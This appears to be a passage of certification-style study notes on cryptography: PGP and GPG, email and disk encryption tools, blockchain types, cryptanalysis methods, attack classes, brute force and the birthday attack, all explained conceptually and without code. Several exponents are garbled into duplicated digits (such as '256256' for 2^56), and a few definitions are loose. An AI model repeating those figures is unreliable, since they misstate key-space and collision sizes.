					- If requested, the client sends its certificate to the server.
					- The client generates a random pre-master secret, encrypts it using the server’s public key, and transmits it to the server.
					- The server decrypts the pre-master secret and, along with the client, derives the master secret and session keys.
					- The client sends a "Change Cipher Spec" message to indicate that it will begin using the new session keys for encryption and hashing, followed by a "Client Finished" message.
					- The server receives the "Change Cipher Spec" message and switches its record layer security state to symmetric encryption using the session keys. It then sends a "Server Finished" message.
					- Once the handshake is complete, the client and server securely exchange application data using session keys for encryption.
				- With the handshake successfully completed, all subsequent communication between the client and server is encrypted and protected.
	- Cryptography Toolkits:
		- Cryptography toolkits consist of cryptographic primitives, algorithms, and schemes that provide security for various applications. Some notable cryptography toolkits are discussed below:
		- OpenSSL (www.openssl.org):
			- OpenSSL is an open-source cryptography toolkit that implements the SSL and TLS network protocols, along with the cryptographic standards they require. It includes a command-line tool that allows users to access various cryptographic functions from OpenSSL’s crypto library via the shell.
			- OpenSSL can be used for:
				- Creating and managing private keys, public keys, and cryptographic parameters
				- Performing public-key cryptographic operations
				- Generating X.509 certificates, certificate signing requests (CSRs), and certificate revocation lists (CRLs)
		- wolfSSL (www.wolfssl.com)
		- AES Crypto Toolkit (www.ni.com)
		- Libsodium (github.com)
		- Crypto++ (cryptopp.com)
		- PyCryptodome (github.com)
	- Pretty Good Privacy (PGP):
		- Pretty Good Privacy (PGP) is a cryptographic protocol used for encrypting and decrypting data while ensuring authentication and privacy. It is commonly used for data compression, digital signing, and encryption/decryption of messages, emails, files, and directories to enhance email communication security.
		- PGP employs a hybrid cryptosystem, combining the advantages of symmetric-key cryptography (which is around 1,000 times faster than public-key encryption) and public-key cryptography (which solves key distribution and data transmission issues). It uses RSA for key exchange and digital signatures, IDEA for bulk encryption, and MD5 for computing message digests.
		- Uses of PGP:
			- PGP is commonly used for:
			- Encrypting messages or files before transmission to ensure that only the recipient can decrypt and read them.
			- Digitally signing plaintext messages to verify the sender’s authenticity.
			- Encrypting stored files to prevent unauthorized access.
			- Securely deleting files beyond simple removal from directories or folders.
			- Compressing data for efficient storage and transmission.
		- How PGP Works:
			- PGP Encryption:
				- The sender encrypts data using PGP, which first compresses the data to reduce patterns that cryptanalysis techniques might exploit.
				- A random one-time secret key is generated (e.g., GSkAQk49fPD2h).
				- The random key encrypts the plaintext, producing the ciphertext.
				- The recipient’s public key encrypts the random key.
				- The public-key-encrypted random key (e.g., Td7YuEkLg99Qd0) is sent along with the ciphertext to the recipient.
			- PGP Decryption:
				- The recipient's PGP software uses their private key to decrypt the encrypted random key.
				- The recovered random key decrypts the ciphertext, revealing the original plaintext.
		- Note: Each step of the PGP encryption process—hashing, data compression, symmetric-key cryptography, and public-key cryptography—uses one of the various supported algorithms.
	- GNU Privacy Guard (GPG):
		- GNU Privacy Guard (GPG) is a free software replacement for PGP and an open implementation of the OpenPGP standard, used for encrypting and decrypting data. GPG is considered a hybrid encryption software program because it employs both symmetric-key and asymmetric-key cryptography. This enhances security and speed, as symmetric encryption is used for data encryption, while asymmetric encryption facilitates secure key exchange by encrypting the session key with the receiver’s public key. GPG also supports S/MIME and Secure Shell (SSH).
		- The latest version of GPG supports a wide range of cryptographic functions, including elliptic curve cryptography (ECDSA, ECDH, and EdDSA). It also integrates with the cryptographic library Libgcrypt for additional security features.
		- Uses of GPG:
			- Proper management of private and public keys
			- Creating new private keys and importing/exporting keys, even if they are in armored formats (e.g., ASCII)
			- Uploading a public key to a key server and signing code with a GPG key for public verification
			- Deleting private keys from local storage
			- Encrypting and signing files using asymmetric encryption for email or FTP file transfers
			- Decrypting and verifying encrypted files using asymmetric keys
			- Detaching signatures so that signature files can be stored separately from message files
			- Managing and building a web of trust
			- Automatically securing messages in messaging applications such as Psi and Fire
		- How GPG Works:
			- GPG Encryption:
				- GPG encrypts messages using asymmetric key pairs.
				- The sender signs the file with their private key to confirm its integrity.
				- The file is then encrypted using the receiver’s public key, making it accessible only with the receiver’s private key.
				- After encryption, the file can be stored locally, distributed via FTP servers, or sent via email.
			- GPG Decryption:
				- Decryption is the reverse of encryption.
				- GPG searches for the receiver’s private key to decrypt the file.
				- After decryption, GPG automatically verifies the sender’s signature using their public key.
	- Web of Trust (WoT):
		- The Web of Trust (WoT) is a trust model used in PGP, OpenPGP, and GnuPG systems. It decentralizes key distribution among PGP users, unlike Public Key Infrastructure (PKI), where a central authority (CA) signs certificates to ensure the authenticity of public keys. In WoT, every user acts as a certificate authority (CA) and can sign the keys of other trusted entities. WoT functions as a network chain in which individuals validate each other’s certificates through their signatures, establishing different levels of trust either directly or indirectly.
		- How WoT Works:
			- In a Web of Trust, every PGP user maintains a keyring containing public keys used for encrypting data. Users introduce others whom they trust, forming a decentralized network. In this model, a user encrypts data with the receiver’s public key, ensuring that only the receiver—who possesses the corresponding private key—can decrypt it.
			- Additionally, every user digitally signs the data with their private key. When the recipient verifies the signature using the sender’s public key, they can confirm the sender’s authenticity.
			- This process ensures that:
				- The data originates from a valid sender and has not been tampered with.
				- Only the intended recipient can decrypt and access the information, as only they hold the corresponding private key.
		- This decentralized approach enhances security and trust without relying on a single centralized authority.
	- Encrypting Email Messages in Outlook:
		- Secure/Multipurpose Internet Mail Extensions (S/MIME) Encryption:
			- S/MIME certification is a technique that allows users to encrypt their email messages. It ensures that only the sender and designated recipients can access the message without compromising its integrity.
			- To encrypt email messages using S/MIME encryption, follow these steps:
				- Prerequisite:
					- A signing certificate must be attached to the keychain before proceeding.
					- Steps:
						- Select File -> Options -> Trust Center -> Trust Center Settings.
						- Choose Email Security from the left pane.
						- In the Encrypted email section, click Settings next to Default Setting.
						- In the Change Security Settings pop-up window, under the Certificates and Algorithms section, select the S/MIME certificate for both the Signing Certificate and Encryption Certificate options. Click OK.
					- Note: This process applies when Outlook is already configured to use S/MIME.
		- Microsoft 365 Message Encryption (OME):
			- Microsoft 365 Message Encryption (OME) allows users to send encrypted emails to any email address. Recipients must either log in to a Microsoft 365 account or use a one-time password to authenticate.
			- To encrypt email messages using OME, follow these steps:
			- Encrypt an email message:
				- In the email message body, select the Options menu.
				- Click Encrypt and choose the desired encryption option, such as Encrypt-Only or Do Not Forward.
			- Encrypt a single email message:
				- Click File, then Properties in the email message body.
				- In the Properties window, click Security Settings under the Security section.
				- In the Security Properties pop-up window, check Encrypt message contents and attachments, then click OK.
			- Encrypt all outgoing messages:
				- Select File -> Options -> Trust Center -> Trust Center Settings.
				- Choose Email Security from the left pane.
				- In the Encrypted email section, check Encrypt contents and attachments for all outgoing messages, then click OK.
	- Signing and Encrypting Email Messages on Mac:
		- Email security in Apple Mail can be enhanced by using encryption features such as digital signatures and message encryption, provided by Apple Mail service providers. Users can send digitally signed and encrypted emails from an Apple device.
		- Sending Digitally Signed and Encrypted Emails:
			- Open Apple Mail on your Mac and click File → New Message.
			- Click the From field and select the account that holds the personal certificate in the Keychain from the pop-up menu.
			- Note: When a personal certificate is enabled in the Keychain, a blue checkmark (✔) appears in the mail, indicating that the outgoing message can be digitally signed.
		- Receiving Digitally Signed and Encrypted Emails:
			- An email received with a signed checkmark icon (✔) indicates that the message is digitally signed by a legitimate sender. The recipient can view the sender’s digital certificate by clicking the icon.
			- If a warning message appears, it suggests that the original email data may have been tampered with or that the sender's identity cannot be verified.
			- An email received with a closed lock icon (🔒) indicates that the message is encrypted. The recipient can access the email only by providing a valid private key for decryption.
	- Encrypting and Decrypting Email Messages Using OpenPGP:
		- While PGP offers strong security, it remains vulnerable to online attacks. However, using OpenPGP (a hybrid of PGP) across multiple environments—such as Windows, macOS, Android, iOS, Linux, and browser plugins—enhances security. Configuring OpenPGP with compatible browser extensions further strengthens email security within the browser environment. Users can leverage browser extension tools like FlowCrypt, which integrates with OpenPGP to facilitate secure email communication.
		- FlowCrypt (Gmail) (flowcrypt.com):
			- FlowCrypt is an end-to-end email encryption tool that integrates with OpenPGP to secure emails and attachments in Gmail (G Suite, Business, and Enterprise). It enables encryption and decryption of emails directly on user devices using private and public keys.
			- Steps to Send and Retrieve an Encrypted Email Using FlowCrypt (Gmail):
				- Setup:
					- Open the browser and enable OpenPGP.
					- Install and configure the FlowCrypt browser extension for Chrome or Firefox.
				- At the Sender’s End:
					- Log in to your Gmail account at https://mail.google.com using the same browser.
					- Click the Secure Compose icon in the left pane. A New Secure Message window appears.
					- Enter the recipient’s email address in the Add Recipient field.
					- Note: If the recipient’s name appears in green, they also have FlowCrypt installed in their browser.
					- Add a Subject and Body (including attachments, if any).
					- Click Encrypt, Sign, and Send to securely send the email.
				- At the Recipient’s End:
					- Open the newly received email.
					- Note: Depending on the settings, the recipient may need to enter their PGP key to decrypt the email.
	- Email Encryption Tools:
		- Several important email encryption tools help secure email messages. Some of them are:
		- RMail (rmail.com): RMail is an email security tool that offers features such as open tracking, delivery proof, email encryption, electronic signatures, and large file transfer. It integrates seamlessly with existing email platforms, including Microsoft Outlook and Gmail. With RMail, users can encrypt sensitive emails and attachments to ensure security and legal compliance.
		- Mailvelope (mailvelope.com)
		- Virtru (www.virtru.com)
		- WebrootTM (www.webroot.com)
		- Secure Email (S/MIME) Certificates (www.ssl.com)
		- Proofpoint Email Protection (www.proofpoint.com)
		- Paubox (www.paubox.com)
	- Disk Encryption:
		- Disk encryption secures data by encrypting every bit stored on a disk or disk volume, preventing unauthorized access. This technology safeguards data confidentiality by converting it into an unreadable format using encryption software or hardware. Disk encryption ensures privacy through passphrases and hidden volumes, functioning similarly to text-message encryption and protecting data even when the operating system is inactive.
		- By encrypting a disk—whether a USB flash drive, external HDD, or backup—users can prevent unauthorized access to sensitive information. Disk-encryption software scrambles stored data into an unreadable code, which can only be accessed after decryption. This makes disk encryption particularly useful for securely transmitting sensitive data and protecting real-time exchanges from potential threats.
		- Encrypted information remains secure unless an attacker successfully decrypts it. Additionally, installing encryption software on a system enhances security, making it essential for devices storing valuable data or handling extensive data transfers.
	- Disk Encryption Tools:
		The primary goal of disk encryption tools is to encrypt a disk partition to ensure the confidentiality of the information stored on it.
		- Below are some commonly used disk encryption tools:
			- VeraCrypt (veracrypt.fr):
				- VeraCrypt is a software application designed for creating and maintaining on-the-fly encrypted volumes (data storage devices). In on-the-fly encryption, data is automatically encrypted before being saved and decrypted immediately upon loading, without requiring user intervention. Data stored on an encrypted volume cannot be accessed without the correct password, keyfile(s), or encryption keys.
				- VeraCrypt encrypts the entire file system, including file names, folder names, free space, and metadata. Users can transfer files to and from a mounted VeraCrypt volume just as they would with any standard disk, using simple drag-and-drop operations. Files are automatically decrypted in memory (RAM) while being read or copied from an encrypted volume, and they are automatically encrypted before being written to the disk.
			- Rohos Disk Encryption (rohos.com):
				- Rohos Disk Encryption allows users to create hidden and encrypted partitions on a computer, USB flash drive, or cloud storage services such as Google Drive, OneDrive, and Dropbox. The tool utilizes the NIST-approved AES encryption algorithm with a 256-bit encryption key, ensuring automatic encryption for enhanced security.
			- BitLocker Drive Encryption (www.microsoft.com)
				- BitLocker provides offline data and operating system (OS) protection for computers running Windows®. It helps prevent unauthorized access to data by encrypting the entire Windows volume.
				- BitLocker utilizes a microchip called a Trusted Platform Module (TPM) to enhance data protection and maintain the integrity of early boot components. The TPM safeguards data from theft or unauthorized access, particularly when the computer is tampered with while the OS is offline.
			- Symantec Encryption (www.broadcom.com)
			- SafeGuard Enterprise Encryption (www.sophos.com)
			- GiliSoft Full Disk Encryption (www.gilisoft.com)
			- Check Point Full Disk Encryption (www.checkpoint.com)
			- DiskCryptor (diskcryptor.org)
		- Disk Encryption Tools for Linux:
			- Cryptsetup (gitlab.com): Cryptsetup is a utility for setting up disk encryption using the dm-crypt kernel module. It supports various encryption formats, including plain dm-crypt volumes, LUKS (Linux Unified Key Setup) volumes, loop-AES, TrueCrypt (with VeraCrypt extensions), and BitLocker.
			- Cryptmount (cryptmount.sourceforge.net)
			- Tomb (dyne.org)
			- CryFS (www.cryfs.org)
			- GnuPG (www.gnupg.org)
			- Harmony Endpoint (www.checkpoint.com)
		- Disk Encryption Tools for macOS:
			- FileVault (support.apple.com): FileVault uses XTS-AES-128 encryption with a 256-bit key to protect the startup disk from unauthorized access. It is available on macOS Lion and later versions. Once FileVault is enabled, the user must log in with their account to access the system. The encryption process begins automatically in the background, ensuring that all files stored on the startup disk are encrypted as soon as they are created.
			- VeraCrypt (www.veracrypt.fr)
			- BestCrypt Volume Encryption (www.jetico.com)
			- Dell Full Disk Encryption (www.dell.com)
			- Comodo Disk Encryption (www.comodo.com)
			- GravityZone Full Disk Encryption (www.bitdefender.com)
	- Blockchain:
		- A blockchain is a type of distributed ledger technology (DLT) used to securely record and store transaction history in the form of blocks. Data recorded in blockchains is resistant to unauthorized modifications, and transparency is maintained through cryptographic techniques. For multiple transactions, multiple blocks are created and cryptographically linked together to form a blockchain. This chain of records, or blocks, is known as a ledger, which is shared across the network to inform participants of all transaction details and the number of assets owned by each member. Members in the network authenticate blocks using their hash values, which are further validated by crypto miners using complex cryptographic algorithms. Once validated, the blocks are approved and added to the blockchain.
		- Blockchains are generally implemented using two mechanisms: hash functions (mostly SHA-256) and asymmetric key algorithms. The process of validating blocks is known as proof of work, for which crypto miners are compensated. The process of adding blocks to a blockchain after performing proof of work is referred to as crypto mining. Each block in a blockchain consists of three elements:
			- Data (transaction details)
			- Hash (a unique identifier)
			- The hash of the previous block
		- Every time a new block is created, it is assigned a new hash value, which is then shared with the next block. The first block in a blockchain is referred to as the genesis block and is represented by a series of zeros. Once a block verifies the hash of the previous block, it is allowed to join the blockchain.
		- If a block is tampered with, the next block in the chain invalidates it because its previous hash value no longer matches. However, blockchain security is not solely ensured by generating hashes and comparing them with other blocks. Attackers can generate valid hashes using advanced cryptographic techniques. To mitigate such risks, the proof of work mechanism is employed. The security of the blockchain relies on both the effective use of hash functions and the proof-of-work process carried out by miners (in public ledgers).
		- The figure below illustrates the process of creating a blockchain. In the figure, a block is created by a participant in a transaction. This block is then shared with all members of the network. Each member validates the block using its hash, after which the block is added to the blockchain. Consequently, every participant has access to the details of the new transaction.
		- Types of Blockchains:
			- Blockchains can be classified into four types, each serving different purposes:
			- Public Blockchain (Public Ledger):
				- A public blockchain operates without a central authority or administrator. It is a decentralized and permissionless network where anyone can join, create, and share blocks. Once data is validated on the blockchain, it becomes immutable and secure from alterations. Examples of public blockchains include Bitcoin and Ethereum. Each member in this blockchain has access to other ledgers without requiring special permissions.
				- Key aspects of public blockchains:
					- Anyone in the network can participate in validation.
					- Once a block is created, it cannot be modified or tampered with.
					- Public blockchains can be used in sectors such as education and healthcare.
					- Public blockchains are suitable for B2C services.
			- Private Blockchain (Private Ledger):
				- A private blockchain is governed by a central authority that determines who can join and participate in the network. In a private ledger, only authorized members have access to transaction data. Examples of private blockchains include Hyperledger and Ripple (XRP).
				- Key aspects of private blockchains:
					- An administrator controls access to the network.
					- Organizations can add or remove participants as needed.
					- Private blockchains can be used in sectors such as defense and banking.
					- Private blockchains are suitable for B2B services.
			- Federated Blockchain (Consortium Blockchain):
				- A federated blockchain, also known as a consortium blockchain, is a partially decentralized system. Unlike private blockchains, where a single entity has control, a consortium blockchain is managed by a group of organizations or individuals. Control is distributed among predetermined or trusted nodes. This type of blockchain is widely used by government organizations and central banks. Federated blockchains offer high speed and scalability. Examples include EWF (Energy Web Foundation) and R3 (banking consortium).
			- Hybrid Blockchain:
				- A hybrid blockchain combines features of both public and private blockchains. In a hybrid blockchain, certain records are publicly accessible, while other data remains confidential within a private network. This allows organizations to control which information is shared and which remains private. An example of a hybrid blockchain is the IBM Food Trust, which enables supply chain transparency while keeping sensitive business data secure.
- Cryptanalysis:
	- Attackers may use various cryptographic attacks to bypass the security of a cryptographic system by exploiting vulnerabilities in code, ciphers, cryptographic protocols, or key management schemes. This process is known as cryptanalysis. Cryptanalysis is the study of ciphers, ciphertext, and cryptosystems to identify vulnerabilities that could allow an attacker to extract plaintext from ciphertext, even without knowing the cryptographic key or encryption algorithm used. This section explores different cryptographic attacks that attackers use to compromise cryptographic systems, as well as various cryptanalysis techniques and tools that aid in breaching cryptographic security.
	- Cryptanalysis Methods:
		- Linear Cryptanalysis:
			- Linear cryptanalysis is a technique used to analyze block ciphers by finding linear approximations of their behavior. This method, invented by Mitsuru Matsui, is a known-plaintext attack that relies on linear approximations to describe the cipher’s operation. By analyzing a sufficient number of plaintext-ciphertext pairs, cryptanalysts can extract bits of information about the encryption key. Naturally, the more pairs available, the higher the probability of success.
			- Cryptanalysis aims to break cryptographic security. For instance, with the 56-bit Data Encryption Standard (DES), a brute-force attack could take up to 256256 attempts. In contrast, linear cryptanalysis requires approximately 243243 known plaintexts, making it more efficient than brute force but still impractical in many cases without enough data.
			- The mathematical foundation of linear cryptanalysis involves constructing linear equations that express the equality of two XORed binary variables. For example, consider the following equation: P1⊕P3⊕C1=K2, where P1P1​ and P3P3​ are bits of the plaintext, C1C1​ is a bit of the ciphertext, and K2K2​ is a bit of the key. By deriving similar equations for multiple bits, an attacker can gradually reconstruct the encryption key.
			- Matsui's Algorithm 2 facilitates this process by analyzing known plaintext-ciphertext pairs. The algorithm works by estimating key bit values based on how frequently an approximation holds across all known pairs. The partial key with the largest absolute deviation from half the total plaintext-ciphertext pairs is considered the most likely candidate.
		- Differential Cryptanalysis:
			- Differential cryptanalysis is a powerful cryptanalytic technique applicable to symmetric-key algorithms. Invented by Eli Biham and Adi Shamir, it studies how differences in the input affect differences in the output. Originally designed for chosen-plaintext attacks, differential cryptanalysis has been extended to work with known plaintext and ciphertext as well.
		- Integral Cryptanalysis:
			- Integral cryptanalysis, first described by Lars Knudsen, extends differential cryptanalysis and is particularly effective against block ciphers based on substitution-permutation networks (SPNs).
			- While differential cryptanalysis examines input pairs differing in a single bit, integral cryptanalysis holds b−kb−k bits constant and cycles through all 2k2k possibilities for the remaining kk bits. When k=1k=1, the method reduces to differential cryptanalysis, but for k>1k>1, it introduces a novel analytical approach.
		- Quantum Cryptanalysis:
			- Quantum cryptanalysis leverages quantum computers to break cryptographic algorithms. Attackers can use:
				- Shor’s Algorithm to factor large numbers efficiently, threatening public-key cryptosystems like RSA and Elliptic Curve Diffie-Hellman (ECDH).
				- Grover’s Algorithm to accelerate brute-force key searches, impacting block ciphers like AES and hash functions such as SHA.
			- To perform quantum cryptanalysis, attackers must obtain encrypted data and have access to substantial quantum computing resources. The key parameters involved in quantum cryptanalysis include:
				- Circuit Width: The number of qubits required per time step.
				- Circuit Depth: The number of time steps required for a quantum circuit.
				- Number of Gates: The total quantum gates used in the circuit.
				- Number of T-Gates: The specific number of T-gates used in the circuit.
				- T-Depth: The time steps required for a T-gate.
				- MAXDEPTH: The maximum circuit depth (e.g., 240240, 264264, or 296296).
	- Cryptography Attacks:
		- Attackers conduct cryptographic attacks by assuming that the cryptanalyst has access to encrypted information. A cryptographic attack, or cryptanalysis, involves studying various principles and methods to decrypt ciphertext back into plaintext without knowledge of the key.
		- The various types of cryptographic attacks are as follows:
			- Ciphertext-Only Attack:
				- A ciphertext-only attack is less effective but more common for an attacker. The attacker only has access to a collection of ciphertexts. This scenario is more likely than a known-plaintext attack but is also the most challenging. The attack is completely successful if the corresponding plaintexts (or even better, the key) can be deduced. Even obtaining partial information about the underlying plaintext is considered a success. To analyze the ciphertexts, the attacker looks for patterns that might reveal hints about the key used. Often, the result of this attack is a partial rather than a complete break.
			- Adaptive Chosen-Plaintext Attack:
				- In this type of attack, an attacker has complete access to the plaintext message and its encryption process. The attacker can also modify the content by making a series of interactive queries, choosing subsequent plaintext blocks based on information gained from previous encryption queries. To execute this attack, the attacker must interact with the encryption device.
			- Chosen-Plaintext Attack:
				- A chosen-plaintext attack is a highly effective type of cryptanalysis attack. The attacker obtains ciphertexts corresponding to a set of plaintexts of their choosing. This allows them to attempt to derive the encryption key and decrypt other messages encrypted with that key. Since the attacker knows both the plaintext and the corresponding ciphertext, they can gain insights into the key used. Although this technique is difficult, it is not impossible.
			- Related-Key Attack:
				- A related-key attack is similar to a chosen-plaintext attack, except that the attacker can obtain ciphertexts encrypted under two different but related keys. This attack is particularly useful in environments where subsequent keys are derived from previous ones, such as in wireless communication. Since the keys are closely related, analyzing the differences can provide clues about the encryption process. Like a ciphertext-only attack, this attack typically results in a partial break.
			- Dictionary Attack:
				- In this attack, the attacker constructs a dictionary of plaintexts along with their corresponding ciphertexts over time. Once the dictionary is built, if the attacker obtains a ciphertext, they can use the dictionary to find the corresponding plaintext. Attackers use this technique to decrypt keys, passwords, passphrases, and ciphertexts.
			- Known-Plaintext Attack:
				- In a known-plaintext attack, the attacker has access to some plaintext blocks along with their corresponding ciphertexts and the encryption algorithm used. Using this information, they attempt to deduce the encryption key to decipher other messages. This attack is effective against block ciphers and is a form of linear cryptanalysis. The known plaintext blocks are often obtained through educated guesses and logical analysis rather than direct access.
			- Chosen-Ciphertext Attack:
				- In this attack, the attacker selects arbitrary ciphertexts and obtains their corresponding plaintexts. Using this information, they attempt to recover the encryption key. To perform this attack, the attacker must have access to the communication channel between the sender and receiver.
				- There are two variants of this attack:
					- Lunchtime or Midnight Attack: The attacker has access to the system for a limited time or can access only a few plaintext-ciphertext pairs.
					- Adaptive Chosen-Ciphertext Attack: The attacker selects a series of ciphertexts and then observes the resulting plaintexts.
			- Rubber-Hose Attack:
				- This attack involves extracting cryptographic secrets (e.g., the password to an encrypted file) through coercion or torture. Under pressure, individuals may be forced to reveal encryption keys, passwords, or other sensitive information.
			- Chosen-Key Attack:
				- In this attack, an attacker not only breaks a ciphertext but also compromises a larger system that depends on that ciphertext. The attacker typically breaks an n-bit key cipher in 2^(n/2) operations. Once successful, they gain access to the system, allowing them to control it, access confidential data, and launch further attacks.
			- Timing Attack:
				- A timing attack is based on measuring the precise execution times of modular exponentiation operations. The attacker attempts to break the ciphertext by analyzing the time taken to execute the encryption and decryption algorithms for various inputs. In a computer system, the execution time of a logical operation may vary based on the input. By providing varying inputs, the attacker attempts to extract the plaintext.
			- Man-in-the-Middle (MITM) Attack:
				- This attack is performed against a cryptographic protocol, where an attacker intercepts communication between a client and a server. The attacker negotiates cryptographic parameters, allowing them to decrypt encrypted content and obtain sensitive information such as passwords. They may also inject commands to modify data in transit. MITM attacks commonly target public-key cryptosystems, where key exchange occurs before communication begins.
	- Code-Breaking Methodologies:
		- The strength of an encryption algorithm can be measured using various code-breaking techniques. Some of the most common methods are as follows:
		- Brute Force:
			- Cryptanalysts attempt to recover the plaintext of a message without knowing the key in advance. They may first try to recover the key or directly attempt to decipher the message. A common cryptanalytic technique is a brute-force attack, also known as an exhaustive search, where every possible key combination is systematically tested. The efficiency of a brute-force attack depends on the hardware used—faster processors can test more keys per second. A successful brute-force attack on the DES encryption method ultimately rendered DES obsolete.
		- Frequency Analysis:
			- Frequency analysis studies the occurrence of letters or groups of letters within a ciphertext. This method relies on the fact that, in any given language, certain letters and letter combinations appear more frequently than others. By analyzing the frequency of symbols in a ciphertext, cryptanalysts can make educated guesses about the original plaintext.
			- For example, in English, the letter “e” is the most commonly used letter. If a particular symbol appears frequently in an encrypted text, it is likely to correspond to “e” or another commonly used letter.
			- Encrypted source code is especially vulnerable to frequency analysis because certain keywords—such as #define, struct, else, and return—occur repeatedly. To protect against such attacks, sophisticated cryptosystems are required.
		- Trickery and Deceit:
			- This method involves social engineering techniques to extract cryptographic keys. Unlike purely mathematical attacks, trickery and deceit rely on manipulating individuals into revealing crucial information.
			- Example: If an attacker knows part of a message’s content, they can use that information to decrypt the rest of the message more easily. A malicious actor might trick or bribe someone into encrypting and sending a known message, which, when intercepted, could be decrypted using standard cryptanalysis techniques.
		- One-Time Pad:
			- Given enough time and resources, any cipher can theoretically be broken—except for the one-time pad, which is considered unbreakable even with infinite computing power.
			- A one-time pad consists of a random, non-repeating set of letters or numbers used only once for encryption. Each character in the plaintext is encrypted with a corresponding key character from the pad. The receiver, using an identical pad, decrypts the message by reversing the encryption process. After a page of the pad is used, it is securely discarded, ensuring that the encryption remains secure.
			- Drawback: The key must be as long as the message itself, making it impractical for encrypting and transmitting large amounts of data.
	- Brute-Force Attack:
		- Cracking cryptographic systems is extremely difficult, as they have no practical weaknesses to exploit. However, it is not impossible. Cryptographic systems use cryptographic algorithms to encrypt messages, relying on a key for encryption and decryption. In cryptography, this key is a crucial parameter that determines the transformation of plaintext into ciphertext and vice versa. If an attacker is able to guess or discover the key, they can decrypt messages and read them in clear text.
		- A common key length is 128 bits, which is considered strong. To prevent key guessing, cryptographic systems use randomly generated keys, making it computationally infeasible to determine them. However, attackers can attempt to decrypt a message by systematically trying all possible keys until they find the correct one. This method is known as a brute-force attack.
		- Brute-force attacks require a massive amount of processing power, making them resource- and time-intensive. For any well-designed cryptographic protocol, the time required to find the key depends on its length. Shorter keys are easier to break, while longer keys require significantly more time. A brute-force attack will only succeed if the attacker has enough time and computational resources.
		- Factors Affecting the Difficulty of a Brute-Force Attack:
			- Several factors influence how difficult a brute-force attack is:
			- Key length – Longer keys exponentially increase the difficulty.
			- Number of possible values per key component – More possible values make brute-force attacks harder.
			- Attempt speed – The time taken to test each key.
			- Defense mechanisms – Systems that lock users out after multiple failed attempts can slow attacks.
		- For example, if a system could brute-force a 56-bit DES key in one second, breaking a 128-bit AES key would take approximately 149 trillion years. Each additional bit in the key length doubles the number of possible keys, requiring twice as much time to brute-force.
		- Power and Cost Estimates for Brute-Force Attacks:
			- Estimated Time to Brute-Force Keys Based on Available Computing Power:
			- 40-bit key (5 characters):
				- Individual with a $2K PC: 1.4 minutes
				- Company with a $100K setup: 2 seconds
				- State-level entity with a $1M infrastructure: 0.2 seconds
			- 56-bit key (7 characters):
				- Individual: 73 days
				- Company: 35 hours
				- State-level entity: 3.5 hours
			- 64-bit key (8 characters):
				- Individual: 50 years
				- Company: 1 year
				- State-level entity: 37 days
			- 128-bit key (16 characters):
				- Individual: 10²⁰ years
				- Company: 10¹⁹ years
				- State-level entity: 10¹⁸ years
		- Although brute-force attacks are theoretically possible, strong encryption methods make them impractical for most real-world scenarios.
		- Birthday Attack:
			- A birthday attack refers to a class of brute-force attacks against cryptographic hash functions that make brute-forcing easier to perform. This attack relies on the birthday paradox, which states that the probability of two or more people in a group of just 23 sharing the same birthday is greater than 50%.
			- Birthday Paradox:
				- How many people are needed to have a high likelihood that two will share the same birthday (i.e., the same day and month, but not the same year)? Since there are 365 days in a year, one might assume that at least 182 people are needed for a 50% chance of a shared birthday. However, surprisingly, only 23 people are required!
				- The reasoning is as follows: If you have 367 people in a room, at least two must share a birthday because there are only 365 days in a year (366 in a leap year). However, the paradox lies in how quickly the probability increases. Even with just 23 people, the probability that at least two share a birthday is already 50%.
			- Birthday Paradox: Probability:
				- The probability that the first person has a unique birthday is 100% (365/365). The second person has a 364/365 chance of having a different birthday. The third person has a 363/365 chance of not sharing a birthday with the first two, and so on.
				- The probability that no two out of 23 people share a birthday is calculated as: 365/365 * 364/365 * 363/365 * ... * 343/365
				- Converting these values to decimals (truncated at three decimal places): 1×0.997×0.994×0.991×⋯×0.936=0.49
				- This means there is a 49% chance that no two people share a birthday. Therefore, the probability that at least two do share a birthday is 51%, making it more likely than not.
			- Application to Cryptographic Hashes:
			- The birthday attack exploits this probability principle to find hash collisions more efficiently. For example, consider the MD5 hash function, which has a 128-bit output. To guarantee a collision through brute force, one would need to compute 21282128 possible hashes—a vast number: 3.4×10^38
			- However, using the birthday paradox, the number of hashes required to have a high probability of finding a collision is approximately: 1.174×√2^128 ≈ 2^64.5 ≈ 2.16 × 10^19
			- While still a large number, it is many orders of magnitude smaller than 21282128, making birthday attacks a practical concern in cryptography.
